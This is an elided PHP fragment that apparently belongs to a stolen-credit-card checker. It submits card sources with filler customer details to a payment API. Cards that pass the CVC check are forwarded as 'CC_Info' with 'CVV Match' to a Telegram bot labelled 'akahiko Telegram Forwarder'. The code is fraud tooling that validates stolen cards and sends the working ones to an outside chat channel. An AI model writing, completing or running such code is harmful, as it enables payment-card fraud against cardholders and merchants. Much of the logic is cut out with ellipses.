...
if(isset($res1['id'])){
    ...
    curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email='.$email.'&description=akahiko&source='.$res1["id"].'&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US');
    ...
    if (isset($res2['error'])) {
        ...
        if (isset($res2['sources'])) {
            ...
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                ...
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>akahiko Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A",$telebot);
                    }
                }
